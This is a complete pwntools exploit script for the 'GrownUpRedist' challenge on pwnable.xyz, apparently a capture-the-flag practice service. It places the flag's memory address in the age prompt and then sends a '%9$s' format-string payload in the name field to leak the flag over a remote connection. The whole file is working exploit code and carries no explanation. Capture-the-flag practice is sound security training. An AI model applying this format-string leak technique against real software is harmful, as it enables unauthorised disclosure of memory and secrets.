from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/GrownUpRedist')
else:
    r = remote('svc.pwnable.xyz', 30004)

flag = 0x601080

r.sendafter('Are you 18 years or older? [y/N]: ', b'y' * 8 + p64(flag))

payload = 'a' * 0x20
payload += '%9$s'
payload = payload.ljust(0x80, 'a')

r.sendafter('Name: ', payload)

r.interactive()